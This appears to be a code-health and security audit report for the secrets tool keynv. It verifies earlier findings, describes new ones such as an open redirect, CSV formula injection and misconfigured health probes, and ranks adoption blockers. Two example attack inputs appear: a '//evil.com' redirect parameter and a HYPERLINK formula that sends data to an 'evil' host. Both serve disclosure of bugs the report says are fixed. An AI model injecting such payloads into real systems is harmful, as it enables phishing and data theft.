# keynv Code Health & Improvement Findings (Cycle 4)

Standalone review cycle (2026-07-02) run **after** `AUDIT-FINDINGS-3.md` was
authored. This cycle does three things the prior ones did not:

1. **Verifies** every Cycle-3 finding (K1–L6) against source — is the report
   trustworthy? (Section A)
2. **Hunts for new gaps** the first three cycles missed, focused on the
   under-covered surfaces: `apps/web`, `apps/server` route-level authz,
   `apps/landing`, and `deploy/`. (Section B)
3. **Assesses adoption readiness** — what stands between this repo and real
   external users ("insanlara kullandırtmak"). (Section C)

Unlike Cycle-3's open register, the four **Cycle-3 CRITICAL items plus the new
HIGH open-redirect were fixed in the same session that produced this document**
(see the "Status" column and the closing note). The remaining items are an open
register for the maintainer to schedule.

Framing note (unchanged from Cycle-3): keynv's core promise is that AI agents
never see real secret values and that leaked copies get scrubbed. **Redaction
correctness is the product** — which is why the redaction fixes led the queue.

---

## Section A — Cycle-3 verification verdict

**The Cycle-3 report is trustworthy.** Of its 21 findings: **16 CONFIRMED**,
**4 PARTIALLY** (directionally right, detail wrong), **0 REFUTED**. Every
file:line citation resolved to the described code (accurate to within a few
lines). Corrections worth recording:

| ID | Verdict | Correction / nuance |
|----|---------|---------------------|
| K1 | CONFIRMED (bug+fix correct) | The illustrative "short pattern `[0,20]` vs entropy `[5,45]`" example is essentially **unreachable**: fixed-length patterns are `\b`-anchored and URI patterns are greedy containers whose stop-chars are a superset of the entropy splitter, so an entropy span is always ⊆ a URI span. The genuinely reachable trigger is **overlapping `literals`** — two resolved secret values sharing text (e.g. `abc123def` + `def456ghi` in `abc123def456ghi` leaks the `456ghi` tail). Severity/finding hold; the example was just weak. No prior test covered this direction (the one overlap test asserted the *opposite* — a wider pattern winning). |
| K3 | CONFIRMED (severity high, not critical) | Drift is real — the shell ERE bank omits patterns present in the canonical bank (twilio SID/API-key, mailgun, sendgrid, slack-webhook) and drops `\b`. But the `watch` daemon is a live backstop and some omissions are intentional (entropy/PEM can't run in pure shell), so **HIGH** is the fairer rating. |
| Y4 | PARTIALLY | The headline `FOO_BAR` vs `FOO-BAR` example does **not** collide — `KEY_RE` permits underscores, so both pass through `toAliasKey` unchanged and distinct. The underlying concern is still real via a narrower path: two names that hit the fallback strip branch (`foo!bar`/`foo@bar` → `foobar`, or names >64 chars) can produce the same `vaultKey`, and `init.ts` keys the group map first-wins with no post-normalization collision check. |
| O3 | PARTIALLY | For the variable-length slack tokens, a `-`-terminated token is still matched via regex backtracking (except at exactly the minimum length). The genuine false negative is only for the **fixed-length** finals (sendgrid `{43}`/`{22}`), where no backtracking can save it. Impact narrower than stated. |
| L5 | PARTIALLY | `.keynv.env` **is** tracked — but it is *designed* to be committed (references, not values), so flagging it as an "artifact" is debatable. `.DS_Store` is **not** tracked (that half is refuted). |

All other findings (K2, K4, Y1, Y2, Y3, O1, O2, O4, O5, O6, O7, L1, L2, L3, L4,
L6) were confirmed as written.

---

## Section B — New findings (not in Cycles 1–3)

`✎` = manually re-confirmed in source during the write-up of this document.

### 🟠 HIGH

**B1. Authenticated open redirect in the token-refresh route** — `FIXED` ✎
**Where:** `apps/web/app/api/auth/refresh/route.ts` (the `next` guard)

The `GET` refresh handler validated its `next` param with only
`if (!next.startsWith('/')) next = '/dashboard'`, then did
`NextResponse.redirect(new URL(next, origin))`. `AUDIT-FINDINGS-2` H1 already
established that `startsWith('/')` is bypassable — `?next=//evil.com` and
`?next=/\evil.com` both pass, and `new URL('//evil.com', origin)` resolves
**off-origin**. Login and register were routed through the `safeNext()` helper
by that earlier fix, but this route was missed and kept the raw check. An
attacker sends a logged-in user `…/api/auth/refresh?next=//evil.com`; the handler
refreshes their session and 307-redirects them to a phishing clone.

**Fix applied:** route `next` through the existing `safeNext()`
(`apps/web/lib/safe-next.ts`), which already blocks `//`, `/\`, and C0/DEL
control chars and is covered by `safe-next.test.ts`.

### 🟡 MEDIUM (open)

**B2. `POST /v1/audit/verify` gating was implicit/fragile — now `FIXED`** ✎
**Where:** `apps/server/src/routes/audit.ts` (the `verify` handler; `listAudit(deps.db, { limit: 1000, sinceId })` with no `orgId`).

`verify` walks the **entire global** audit table (it can't be org-scoped — the
HMAC chain interleaves all orgs into one append-only sequence) and returns
`checked` (system-wide row count) and `broken_at_id` (a global row id).

**Correction after verification:** the original claim that a `reader` could reach
it is **not exploitable today**. `verify` was guarded by `audit.read`, a
*project-level* action, and the route passes **no** project context, so
`authorize()` denies every non-owner/admin caller at the `if (!projectId) return
'deny'` branch (`packages/rbac/src/authorize.ts`). So it was already
owner/admin-only — but only *by accident* of the route not passing a project id;
a future edit that threaded a `project_id` (or a reader with any membership)
would have opened it, and the matrix listing `audit.read` for all five roles
made that look intentional.

**Fix applied:** added a dedicated **org-level** `audit.verify` action granted to
`['owner','admin']` and switched the route to `guard(c, 'audit.verify')`. The
restriction is now explicit and independent of project context. (The
resource-exhaustion surface remains for owner/admin, who are trusted.)

**B3. CSV formula injection in the audit export** — `FIXED`
**Where:** `apps/web/app/(authed)/audit/_actions/export-action.ts` (`csvEscape`)

`csvEscape` quoted fields containing `,` / `"` / newline but did **not**
neutralize spreadsheet formula prefixes (`=`, `+`, `-`, `@`, tab, CR). The
`actor_agent` column is client-controlled: the server stores the `X-Keynv-Agent`
header verbatim (documented as untrusted in `apps/server/src/lib/agent.ts`). An
attacker makes any authed request with an agent header like
`=HYPERLINK("http://evil/?"&A1)`; when an admin exports the audit log and opens
it in Excel/Sheets, the formula executes in the admin's context.
**Fix applied:** cells beginning with `= + - @` / tab / CR are prefixed with a
single quote before CSV-quoting. (B5 fixed in the same function.)

**B4. Deploy liveness/readiness probes target an endpoint that never fails** — `FIXED` ✎
**Where:** `deploy/docker-compose.yml`, `deploy/coolify.yml`, `deploy/helm/keynv/templates/statefulset.yaml`

All probes hit `/v1/health`, whose handler always returns HTTP 200 even when the
DB check fails (it only flips `ok:false` in the body, `apps/server/src/routes/health.ts`).
The purpose-built `/v1/health/ready` (returns **503** on DB failure) was unused
everywhere. Consequence: a server whose DB is broken stays "healthy" in Compose
and "Ready" in Kubernetes, so traffic keeps routing to it and it never restarts.
**Fix applied:** k8s livenessProbe → `/v1/health/live` (process-only, no restart
loop on a DB blip); k8s readinessProbe + Compose/Coolify healthcheck →
`/v1/health/ready` (drains traffic / marks unhealthy on DB failure).

### 🔵 LOW (open)

- **B5. Audit CSV `payload` column is always `[object Object]`** —
  `export-action.ts` lists `payload` in `cols`, but `/v1/audit` returns it as an
  object, so `csvEscape(String(obj))` emits the literal `[object Object]` for
  every row. The CSV therefore drops the most useful data (alias/key/env/version
  the JSON export preserves). Fix: `JSON.stringify(e.payload)` before escaping.
- **B6. Landing license/phase copy is stale and self-contradictory** —
  `apps/landing/index.html` says "Source-available, MIT-when-Phase-5 ships" and
  "treat as not-yet-OSI-licensed until Phase 5 ships," but the repo `LICENSE` is
  **already MIT**, `docs/roadmap.md` marks Phase 5 done, and
  `apps/web/app/llms.txt/route.ts` states the product is "available under MIT."
  A legal/marketing accuracy problem on the primary public surface.
- **B7. Cross-surface contradiction on "keynv Cloud"** — `apps/landing/index.html`
  markets keynv Cloud as "Public beta … Sign up free," while
  `apps/web/app/llms.txt/route.ts` states "keynv Cloud is not available today;
  self-host is the working path" and calls Cloud a Phase-6 roadmap item. Two live
  public surfaces make opposite claims. (Note: as of this cycle `keynv.dev` and
  `api.keynv.dev` **are** live and serving `rc.21` — see Section C — so the
  reconciliation is "align the copy," not "stand up the service.")
- **B8. `min_cli_version` drift** — `apps/server/src/routes/health.ts` hardcodes
  `min_cli_version: '0.1.0-rc.21'`; `scripts/sync-version.mjs` only rewrites the
  `version` field of the package.jsons, never this literal (nor the copies in
  `docs/api-compatibility.md` / `docs/06-api-spec.md`). Worse, the integration
  test hardcodes the same literal, so CI won't catch the drift. On the next
  release the server keeps advertising a stale minimum CLI. Fix: derive it from
  `pkg.version`, or add these files to the sync script.

### Minor notes (low confidence / low impact)

- **Search org-scoping inconsistency** — `apps/server/src/routes/search.ts`: the
  developer path filters by `user.memberships` (loaded globally, not scoped to
  the active org) while the admin path scopes to `user.org_id`. Impact limited to
  a user acting under a *secondary* active org still seeing their primary-org
  project secrets in results — a scoping inconsistency, not a cross-tenant breach.
- **`keynv exec` has no parent→child signal forwarding** —
  `apps/cli/src/exec/spawn.ts` spawns with `detached:false` and no
  `SIGINT`/`SIGTERM` handlers. Terminal Ctrl+C still reaches the child via the
  shared process group, but a programmatic `kill <cli-pid>` exits the CLI and can
  orphan the subprocess. Robustness nit (adjacent to Cycle-3 L6).

### Areas swept and found clean

RBAC matrix + single-chokepoint honored by every protected route; secrets routes
org-scoped on read/write/test with `withDecryptedSecretBytes` zeroing; members /
users / org / approvals routes org-scoped with self-modification guards intact;
web session sealing (AES-256-GCM + nonce + tag), CSRF on all mutating actions,
`safeNext` correct on login/register; **no** `dangerouslySetInnerHTML`/`innerHTML`
anywhere in `apps/web`, markdown rendered without `rehype-raw`; MCP tools are
metadata-only except `test_connection`, whose value path is triple-sanitized;
server security headers + HSTS + single-origin CORS + per-user/IP rate limiters +
pino redaction; Dockerfiles multi-stage, non-root, `tini` init. No code-level
TODO/FIXME/HACK markers indicating known-broken behavior remain in `apps/` or
`packages/` src.

---

## Section C — Adoption readiness

**Live-checked this cycle:** `api.keynv.dev/v1/health` returns
`{ok:true, version:"0.1.0-rc.21", db:"ok", public_registration:true}`;
`keynv.dev/` (200), `/register` (200), `/dashboard` (307→login), `/docs` (200)
all respond. **The hosted service is deployed and working** — it just runs the
`rc.21` tag. (This refutes a static-analysis assumption that the default server
was dead; that came from a stale `apps/landing/README.md` "isn't pointed yet"
note.)

### Fact sheet — distribution state

- `@keynv/cli` is published to npm, public, with provenance; `npm i -g @keynv/cli`
  is a real install path. The CLI is genuinely **standalone** — `tsup` bundles
  every `@keynv/*` package and most deps (`noExternal`), so the un-published
  private packages don't block it. Its `bin` is `keynv`, and every README
  quickstart command exists and is registered.
- `@keynv/core`, `@keynv/redactor`, `@keynv/testers` publish to npm (for the
  external MCP repo to consume). `@keynv/mcp`, `@keynv/rbac`,
  `@keynv/text-surfaces`, `@keynv/server`, `@keynv/web`, `@keynv/landing` are all
  `private:true`.
- The release pipeline (`release.yml`, tag-driven `v*`) also ships a cosign-signed
  multi-arch server image to GHCR and a GitHub Release with 5 CLI binaries +
  `SHA256SUMS`. rc prereleases publish to the `next` tag then get **promoted to
  `latest`**, so `npm i -g @keynv/cli` resolves the rc.

### Adoption blockers (ranked, highest bounce first)

1. **The headline product isn't in any published/deployed version.** The entire
   Phase-A text-surface layer (doctor/scrub/watch/shell) that the README leads
   with sits under `## [Unreleased]` in `CHANGELOG.md`; the newest tag is `rc.21`,
   and both npm and the hosted site serve it. Someone who `npm i -g @keynv/cli`
   today may not get the demo that sold them. **→ cut a release containing the
   hero** (this session prepares `rc.22`).
2. **The `@keynv/cli` npm page renders blank.** `apps/cli/package.json` lists
   `files: ["dist","README.md","LICENSE"]` but `apps/cli` contains neither
   README nor LICENSE — the primary discovery surface has no content.
3. **The landing page contradicts the README and the actual license.** It
   positions keynv as a "self-hosted vault," pushes "keynv Cloud … Sign up free,"
   and claims the project is "not-yet-OSI-licensed" — all contradicted by the
   README's own disclaimer, the live Cloud service, and the shipped MIT LICENSE.
   Zero mention of the doctor/scrub/watch wedge. (See B6/B7.)
4. **The alias flow — the "AI agents never see secrets" pitch — requires login.**
   `keynv init` hard-requires a logged-in session. The hosted service now exists
   with public registration on, so this is reachable, but the README's alias
   examples still silently assume infrastructure a brand-new user hasn't set up.
5. **The MCP wedge — the obvious Claude Code entry — is undistributed.** The full
   MCP server exists here but is `private:true` and being relocated to a separate
   repo; `docs/ai-setup.md` tells users `npm i -g @keynv/mcp`, which this repo
   never publishes.
6. **`docs/ai-setup.md` (the only Claude Code / Cursor / MCP wiring guide) is not
   linked from the README** Documentation table, and points to a
   `keynv.dev/docs/ai-setup` path.
7. **No low-effort binary install** — README promises signed binaries at GitHub
   Releases, but there is no `install.sh` / `curl | bash` / Homebrew tap.
8. **Contributor onboarding has broken links** — `CONTRIBUTING.md` links to a
   `./CLAUDE.md` that doesn't exist (the repo uses `AGENTS.md`) and references a
   PR template that isn't present; no `.github/ISSUE_TEMPLATE/`, `CODEOWNERS`, or
   Dependabot.
9. **Doc drift** — `getting-started.md` / `quickstart.md` still present a
   server-first framing; role lists differ across README (5), landing (4), and
   the changelog (5) surfaces.
10. **"Not ready" signals** — three `AUDIT-FINDINGS*.md` in the repo root; 21 `rc`
    tags with no `0.1.0` final; partial Windows support.

### Adoption opportunities (ranked, highest leverage first)

1. **Ship the text-surface release** (`rc.22` in this session) so the hero lands
   in both npm and the hosted site. `npm i -g @keynv/cli && keynv doctor` is a
   genuinely zero-server, zero-login "scan your machine for leaked secrets" hook —
   the only funnel with no infrastructure dependency. Lead with it everywhere.
2. **Add `apps/cli/README.md` + `apps/cli/LICENSE`** (already declared in `files`)
   so the npm page isn't blank.
3. **Reconcile the landing page** to the README + reality (fix license/phase copy,
   decide the Cloud message now that the service is live, surface doctor/scrub/watch).
4. **Own the Claude Code MCP wedge** — decide the `@keynv/mcp` home, publish it,
   and add a one-command `claude mcp add keynv …` + `.cursor/mcp.json` snippet to
   the README; link `ai-setup.md`. Highest-intent audience for "AI-safe secrets."
5. **Add a `curl | bash` installer + Homebrew tap** — the signed binaries +
   `SHA256SUMS` already exist; wrap them into a one-liner.
6. **Reconcile & link the docs** — point README to getting-started / quickstart /
   ai-setup; add a troubleshooting/FAQ page, a per-OS install matrix, and a short
   "keynv vs dotenv/doppler/infisical/1password" comparison.
7. **Community scaffolding** — `.github/ISSUE_TEMPLATE/`, `PULL_REQUEST_TEMPLATE.md`,
   fix the `CLAUDE.md`→`AGENTS.md` link, add Dependabot + `CODEOWNERS`, and move
   the `AUDIT-FINDINGS*.md` files under `docs/audits/`.
8. **A `keynv doctor` GitHub Action** — `keynv exec` already supports headless
   token auth; a marketplace Action running the server-less `doctor` scan turns the
   local scanner into a zero-auth CI integration.

---

## Status summary

| ID | Sev | Area | Status |
|----|-----|------|--------|
| K4 | CRITICAL | mcp | **FIXED** — consume-on-success (peek → fetch → consume) |
| K1 | CRITICAL | redactor | **FIXED** — de-overlap extends to union span (+ literal-overlap regression test) |
| Y1 | HIGH | redactor | **FIXED** — single left-to-right pass + `join` (O(n)) |
| K2 | CRITICAL | cli/init | **FIXED** — `--yes` treats `ambiguous` as secret (fail-safe) |
| B1 | HIGH | web | **FIXED** — refresh route uses `safeNext()` |
| Y2 | HIGH | cli/watcher, mcp | **FIXED** — 64 KB per-line buffer cap on both IPC sockets (+ regression test) |
| B2 | MEDIUM | server | **FIXED** — dedicated org-level `audit.verify` action (owner/admin); gating now explicit (+ test) |
| B3 | MEDIUM | web | **FIXED** — CSV export neutralizes `= + - @` / tab / CR formula prefixes |
| B4 | MEDIUM | deploy | **FIXED** — liveness→`/health/live`, readiness/compose→`/health/ready` |
| B5 | LOW | web | **FIXED** — CSV `payload` column now `JSON.stringify`'d (was `[object Object]`) |
| K3 | HIGH* | redactor/shell | OPEN — codegen or CI-diff the shell bank |
| Y3 | HIGH | cli/init, text-surfaces | OPEN — collision-check backups |
| Y4 | MEDIUM* | cli/init | OPEN — post-normalization key collision check |
| O1–O7, B6–B8 | MEDIUM/LOW | cross-cutting | OPEN |
| L1–L6 | LOW | tooling/hygiene | OPEN |

\* severity revised from Cycle-3 during verification (Section A).

### Suggested next sequencing

1. **K3, Y3, Y4** — remaining robustness follow-ups from Cycle-3 (shell-bank
   drift, same-bucket backup overwrite, key-normalization collision).
2. **B6/B7 + B8** — reconcile the landing license/Cloud copy with the live
   reality; make `min_cli_version` derive from `pkg.version`.
3. **O-series** — comments-vs-reality, dead code, dedup, targeted auth unit tests.
4. **Adoption pass** — opportunities 2–8 above, gated behind shipping `rc.22`
   (opportunity 1), which this session prepares.
